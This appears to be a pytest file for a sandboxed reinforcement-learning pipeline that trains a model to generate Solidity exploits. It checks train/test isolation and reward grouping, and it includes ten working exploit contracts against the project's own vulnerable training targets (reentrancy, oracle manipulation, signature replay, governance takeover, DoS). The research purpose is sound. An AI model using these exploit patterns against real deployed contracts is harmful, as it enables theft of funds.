"""
tests/test_train_rollout_collector.py

Unit and Foundry integration tests for the isolated GRPO train split and
`core/train_rollout_collector.py`.
"""

from __future__ import annotations

import hashlib
import json
import os
import re
from pathlib import Path
from typing import Dict

import pytest

from core.evidence import HarnessVerdict
from core.grpo_trainer import (
    diagnose_group_spread,
    group_rollouts_by_prompt,
    load_production_trajectories,
)
from core.schemas import (
    AttackHypothesis,
    ExecutionResult,
    ExploitPayload,
    ResultCategory,
    TargetProgram,
)
from core.train_rollout_collector import (
    DEFAULT_BENCHMARK_DATASET_PATH,
    DEFAULT_TRAIN_DATASET_PATH,
    collect_train_rollouts,
    load_train_targets,
    validate_train_target_isolation,
)
from sandbox.runner import (
    LOCAL_TRAIN_HARNESSES_DIR,
    LOCAL_TRUSTED_HARNESSES_DIR,
    TRAIN_TRUSTED_HARNESS_CONTRACTS,
    TRUSTED_HARNESS_CONTRACTS,
    load_trusted_harness_code,
    run_payload_in_sandbox,
)

REPO_ROOT = Path(__file__).resolve().parents[1]


def _sha256_file(path: Path) -> str:
    return hashlib.sha256(path.read_text(encoding="utf-8").encode("utf-8")).hexdigest()


def _extract_contract_names(sol_text: str) -> set[str]:
    return set(re.findall(r"\bcontract\s+([A-Za-z_][A-Za-z0-9_]*)", sol_text))


def _flat_targets(dataset_path: Path) -> list[dict]:
    data = json.loads(dataset_path.read_text(encoding="utf-8"))
    out = []
    for cls in data.get("classes", []):
        out.extend(cls.get("targets", []))
    out.extend(data.get("synthetic_controls", []))
    return out


# =============================================================================
# 1. DATA ISOLATION TESTS
# =============================================================================


def test_train_and_test_splits_have_zero_overlap():
    """Zero overlap in target_name, contract_id, contract names, filenames, or SHA-256."""
    test_entries = _flat_targets(DEFAULT_BENCHMARK_DATASET_PATH)
    train_entries = _flat_targets(DEFAULT_TRAIN_DATASET_PATH)

    assert len(test_entries) == 16
    assert 8 <= len(train_entries) <= 10
    assert len(TRUSTED_HARNESS_CONTRACTS) == 16
    assert len(TRAIN_TRUSTED_HARNESS_CONTRACTS) == len(train_entries)

    test_names = {e["target_name"] for e in test_entries}
    train_names = {e["target_name"] for e in train_entries}
    assert test_names.isdisjoint(train_names)
    assert set(TRUSTED_HARNESS_CONTRACTS.keys()).isdisjoint(TRAIN_TRUSTED_HARNESS_CONTRACTS.keys())

    test_ids = {e["contract_id"] for e in test_entries}
    train_ids = {e["contract_id"] for e in train_entries}
    assert test_ids.isdisjoint(train_ids)

    test_sol_dir = Path(LOCAL_TRUSTED_HARNESSES_DIR)
    train_sol_dir = Path(LOCAL_TRAIN_HARNESSES_DIR)

    test_hashes = {
        _sha256_file(p)
        for p in test_sol_dir.rglob("*.sol")
        if not p.name.endswith("Harness.t.sol")
    }
    train_hashes = {
        _sha256_file(p)
        for p in train_sol_dir.glob("*.sol")
        if not p.name.endswith("Harness.t.sol")
    }
    assert test_hashes.isdisjoint(train_hashes)

    test_filenames = {p.name for p in test_sol_dir.rglob("*.sol")}
    train_filenames = {p.name for p in train_sol_dir.glob("*.sol")}
    assert test_filenames.isdisjoint(train_filenames)

    test_contract_names: set[str] = set()
    for p in test_sol_dir.rglob("*.sol"):
        test_contract_names.update(_extract_contract_names(p.read_text(encoding="utf-8")))
    train_contract_names: set[str] = set()
    for p in train_sol_dir.glob("*.sol"):
        train_contract_names.update(_extract_contract_names(p.read_text(encoding="utf-8")))
    assert test_contract_names.isdisjoint(train_contract_names)


def test_collector_refuses_test_targets_fail_closed(tmp_path):
    """Collector and runner refuse test targets like Vault and ERC4626Vault."""
    vault_target = TargetProgram(
        name="Vault",
        source_code=(Path(LOCAL_TRUSTED_HARNESSES_DIR) / "Vault.sol").read_text(encoding="utf-8"),
        language="solidity",
    )
    erc4626_target = TargetProgram(
        name="ERC4626Vault",
        source_code=(Path(LOCAL_TRUSTED_HARNESSES_DIR) / "ERC4626Vault.sol").read_text(encoding="utf-8"),
        language="solidity",
    )

    for forbidden in (vault_target, erc4626_target):
        with pytest.raises(ValueError, match="Data isolation violation"):
            validate_train_target_isolation(forbidden)

        with pytest.raises(ValueError, match="Data isolation violation"):
            collect_train_rollouts(
                targets=[forbidden],
                trajectory_dir=str(tmp_path),
                generator_fn=lambda t, p, temp, idx: ExploitPayload(
                    target_name=t.name,
                    hypothesis=AttackHypothesis(
                        vulnerability_type="Reentrancy",
                        reasoning_trace="trace",
                        attack_vector="vec",
                    ),
                    test_code="contract ExploitModule {}",
                    generated_token_ids=[1, 2, 3],
                ),
            )

    # Default harness loader must not expose train harnesses unless explicitly opted in
    with pytest.raises(FileNotFoundError):
        load_trusted_harness_code("TrainShareVault")
    assert "TrainShareVaultHarness" in load_trusted_harness_code(
        "TrainShareVault", allow_train_split=True
    )


# =============================================================================
# 2. NON-DEGENERATE GRPO GROUPS & INFRA_ERROR EXCLUSION
# =============================================================================


def test_train_rollout_collector_produces_non_degenerate_grpo_groups(tmp_path):
    """
    Collector persists mixed outcomes (+1.0, -0.10, -0.25, -0.50, -0.35),
    excludes INFRA_ERROR, and yields informative_groups > 0 via load_production_trajectories.
    """
    train_targets = load_train_targets()[:2]
    assert len(train_targets) == 2

    def fake_generator(
        target: TargetProgram,
        prompt_text: str,
        temperature: float,
        cand_idx: int,
    ) -> ExploitPayload:
        # 6 candidates per target: breach, safe, revert, compile_err, format_err, infra_err
        is_format_err = cand_idx == 4
        return ExploitPayload(
            target_name=target.name,
            hypothesis=AttackHypothesis(
                vulnerability_type=target.invariants[0] if target.invariants else "Logic",
                reasoning_trace=f"temp={temperature}",
                attack_vector="exploit",
            ),
            test_code=(
                "invalid"
                if is_format_err
                else f"// cand {cand_idx}\ncontract ExploitModule {{ constructor(address a) payable {{}} function runExploit() external payable {{}} receive() external payable {{}} }}"
            ),
            format_valid=not is_format_err,
            format_error_reason="Missing pragma" if is_format_err else "",
            raw_model_response=f"reasoning temp={temperature} idx={cand_idx}",
            generated_token_ids=[100 + cand_idx, 200 + cand_idx, 300 + cand_idx],
            candidate_index=cand_idx,
        )

    def fake_verifier(target: TargetProgram, payload: ExploitPayload) -> ExecutionResult:
        idx = payload.candidate_index
        if idx == 0:
            return ExecutionResult(
                return_code=0,
                stdout="",
                stderr="",
                execution_time_sec=0.1,
                category=ResultCategory.EXPLOIT_CONFIRMED,
                invariant_violated=True,
                test_status="Success",
                verified_by_harness=True,
                reproducibility_confirmed=True,
                harness_verdict=HarnessVerdict.BREACH.value,
                harness_suite=f"test/{target.name}Harness.t.sol",
            )
        if idx == 1:
            return ExecutionResult(
                return_code=1,
                stdout="",
                stderr="",
                execution_time_sec=0.1,
                category=ResultCategory.SAFE_RUN,
                invariant_violated=False,
                test_status="Failure",
                revert_reason="EXPLOIT_FAILED: invariant held",
                verified_by_harness=True,
                harness_verdict=HarnessVerdict.NO_BREACH.value,
            )
        if idx == 2:
            return ExecutionResult(
                return_code=1,
                stdout="",
                stderr="",
                execution_time_sec=0.1,
                category=ResultCategory.RUNTIME_REVERT,
                invariant_violated=False,
                test_status="Failure",
                revert_reason="OutOfFunds",
                verified_by_harness=True,
                harness_verdict=HarnessVerdict.EXEC_REVERT.value,
            )
        if idx == 3:
            return ExecutionResult(
                return_code=1,
                stdout="",
                stderr="Compiler run failed: ParserError",
                execution_time_sec=0.1,
                category=ResultCategory.COMPILATION_ERROR,
                invariant_violated=False,
            )
        if idx == 4:
            return ExecutionResult(
                return_code=-4,
                stdout="",
                stderr="GENERATION_FORMAT_ERROR: Missing pragma",
                execution_time_sec=0.0,
                category=ResultCategory.GENERATION_FORMAT_ERROR,
                invariant_violated=False,
            )
        return ExecutionResult(
            return_code=-5,
            stdout="",
            stderr="INFRA_ERROR: transient sandbox error",
            execution_time_sec=0.0,
            category=ResultCategory.INFRA_ERROR,
            invariant_violated=False,
        )

    summary = collect_train_rollouts(
        targets=train_targets,
        trajectory_dir=str(tmp_path),
        generator_fn=fake_generator,
        verifier_fn=fake_verifier,
        group_size=6,
        temperatures=[0.2, 0.4, 0.6, 0.7, 0.8, 0.9],
        run_id="run_train_unit",
    )

    assert summary.targets_processed == 2
    assert summary.candidates_generated == 12
    assert summary.excluded_infra_count == 2
    assert summary.persisted_count == 10
    assert summary.group_spread["informative_groups"] == 2

    loaded = load_production_trajectories(str(tmp_path), target_split="train")
    assert len(loaded) == 10

    rewards_by_cat = {r["category"]: r["reward"] for r in loaded}
    assert rewards_by_cat["EXPLOIT_CONFIRMED"] == pytest.approx(1.0)
    assert rewards_by_cat["SAFE_RUN"] == pytest.approx(-0.10)
    assert rewards_by_cat["RUNTIME_REVERT"] == pytest.approx(-0.25)
    assert rewards_by_cat["COMPILATION_ERROR"] == pytest.approx(-0.50)
    assert rewards_by_cat["GENERATION_FORMAT_ERROR"] == pytest.approx(-0.35)
    assert "INFRA_ERROR" not in rewards_by_cat

    for rec in loaded:
        assert rec["dataset_partition"] == "production"
        assert rec["dataset_split"] == "train"
        assert rec["trainable"] is True
        assert rec["is_synthetic"] is False
        assert rec["token_provenance"] == "model_generate"
        assert rec["prompt_used"]
        assert len(rec["generated_token_ids"]) > 0

    groups = group_rollouts_by_prompt(loaded, group_size=5)
    spread = diagnose_group_spread(groups)
    assert spread["total_groups"] == 2
    assert spread["informative_groups"] == 2


# =============================================================================
# 3. FOUNDRY COMPILATION & E2E VERIFICATION OF ALL 10 TRAIN TARGETS
# =============================================================================

WORKING_TRAIN_EXPLOITS: Dict[str, str] = {
    "TrainShareVault": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {TrainShareVault} from "../src/TrainShareVault.sol";
contract ExploitModule {
    TrainShareVault public target;
    constructor(address _t) payable { target = TrainShareVault(payable(_t)); }
    function runExploit() external payable {
        target.depositAssets{value: 1}();
        (bool ok, ) = payable(address(target)).call{value: msg.value - 1}("");
        require(ok);
    }
    receive() external payable {}
}
""",
    "TrainCreditBridge": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {TrainCreditBridge} from "../src/TrainCreditBridge.sol";
contract ExploitModule {
    TrainCreditBridge public target;
    constructor(address _t) payable { target = TrainCreditBridge(payable(_t)); }
    function runExploit() external payable {
        bytes32 tid = target.getDefaultTransferId();
        for (uint256 i = 0; i < 4; i++) {
            target.releaseCredit(tid, payable(address(this)));
        }
    }
    receive() external payable {}
}
""",
    "TrainRewardPool": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {TrainRewardPool} from "../src/TrainRewardPool.sol";
contract ExploitModule {
    TrainRewardPool public target;
    constructor(address _t) payable { target = TrainRewardPool(payable(_t)); }
    function runExploit() external payable {
        target.stake{value: msg.value}();
        for (uint256 i = 0; i < 5; i++) {
            target.claimPayout();
        }
        target.unstake(msg.value);
    }
    receive() external payable {}
}
""",
    "TrainOraclePool": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {TrainOraclePool, MockSpotFeed} from "../src/TrainOraclePool.sol";
contract ExploitModule {
    TrainOraclePool public target;
    constructor(address _t) payable { target = TrainOraclePool(payable(_t)); }
    function runExploit() external payable {
        target.postCollateral{value: msg.value}();
        MockSpotFeed feed = target.feed();
        feed.updateSpotPrice(10 ether);
        target.borrowFromPool(8 ether);
    }
    receive() external payable {}
}
""",
    "TrainVoucherEscrow": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {TrainVoucherEscrow} from "../src/TrainVoucherEscrow.sol";
contract ExploitModule {
    TrainVoucherEscrow public target;
    constructor(address _t) payable { target = TrainVoucherEscrow(payable(_t)); }
    function runExploit() external payable {
        (address r, uint256 amt, uint8 v, bytes32 rSig, bytes32 sSig) = target.lastVoucher();
        for (uint256 i = 0; i < 3; i++) {
            target.redeemVoucher(r, amt, v, rSig, sSig);
        }
    }
    receive() external payable {}
}
""",
    "TrainPushAuction": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {TrainPushAuction} from "../src/TrainPushAuction.sol";
contract ExploitModule {
    TrainPushAuction public target;
    constructor(address _t) payable { target = TrainPushAuction(payable(_t)); }
    function runExploit() external payable {
        target.placeBid{value: msg.value}();
    }
    receive() external payable {
        revert("DoS");
    }
}
""",
    "TrainFeeRoundingVault": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {TrainFeeRoundingVault} from "../src/TrainFeeRoundingVault.sol";
contract ExploitModule {
    TrainFeeRoundingVault public target;
    constructor(address _t) payable { target = TrainFeeRoundingVault(payable(_t)); }
    function runExploit() external payable {
        for (uint256 i = 0; i < 20; i++) {
            target.depositWithFee{value: 1}();
        }
        target.withdrawCredits(40);
    }
    receive() external payable {}
}
""",
    "TrainAdminTreasury": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {TrainAdminTreasury} from "../src/TrainAdminTreasury.sol";
contract ExploitModule {
    TrainAdminTreasury public target;
    constructor(address _t) payable { target = TrainAdminTreasury(payable(_t)); }
    function runExploit() external payable {
        target.updateGovernance(address(this));
        target.sweepTreasury(payable(address(this)));
    }
    receive() external payable {}
}
""",
    "TrainReentrancyBank": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {TrainReentrancyBank} from "../src/TrainReentrancyBank.sol";
contract ExploitModule {
    TrainReentrancyBank public target;
    constructor(address _t) payable { target = TrainReentrancyBank(payable(_t)); }
    function runExploit() external payable {
        target.depositFunds{value: msg.value}();
        target.cashOut();
    }
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.cashOut();
        }
    }
}
""",
    "TrainFlashStaking": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {TrainFlashStaking} from "../src/TrainFlashStaking.sol";
contract ExploitModule {
    TrainFlashStaking public target;
    constructor(address _t) payable { target = TrainFlashStaking(payable(_t)); }
    function runExploit() external payable {
        target.enterStake{value: msg.value}();
        target.harvestInstantBonus();
        target.exitStake();
    }
    receive() external payable {}
}
""",
}


@pytest.mark.skipif(
    os.environ.get("FOUNDRY_CI", "").strip().lower() != "true",
    reason="Requires real Foundry toolchain (FOUNDRY_CI=true)",
)
def test_foundry_train_targets_and_harnesses_e2e():
    """Compile and execute all 10 train targets against their trusted harnesses in Foundry."""
    train_targets = load_train_targets()
    assert len(train_targets) == 10

    for target in train_targets:
        exploit_payload = ExploitPayload(
            target_name=target.name,
            hypothesis=AttackHypothesis(
                vulnerability_type=target.invariants[0],
                reasoning_trace="train verification",
                attack_vector="working exploit",
            ),
            test_code=WORKING_TRAIN_EXPLOITS[target.name],
            generated_token_ids=[1, 2, 3],
        )
        breach_res = run_payload_in_sandbox(target, exploit_payload, allow_train_split=True)
        assert breach_res.category == ResultCategory.EXPLOIT_CONFIRMED, (
            f"{target.name} failed breach check: {breach_res.stderr}"
        )
        assert breach_res.harness_verdict == HarnessVerdict.BREACH.value

        noop_payload = ExploitPayload(
            target_name=target.name,
            hypothesis=AttackHypothesis(
                vulnerability_type=target.invariants[0],
                reasoning_trace="noop",
                attack_vector="noop",
            ),
            test_code=(
                "// SPDX-License-Identifier: MIT\n"
                "pragma solidity ^0.8.20;\n"
                "contract ExploitModule {\n"
                "    constructor(address) payable {}\n"
                "    function runExploit() external payable {}\n"
                "    receive() external payable {}\n"
                "}\n"
            ),
            generated_token_ids=[4, 5, 6],
        )
        safe_res = run_payload_in_sandbox(target, noop_payload, allow_train_split=True)
        assert safe_res.category == ResultCategory.SAFE_RUN, (
            f"{target.name} noop did not yield SAFE_RUN: {safe_res.category} {safe_res.stderr}"
        )
        assert safe_res.harness_verdict == HarnessVerdict.NO_BREACH.value
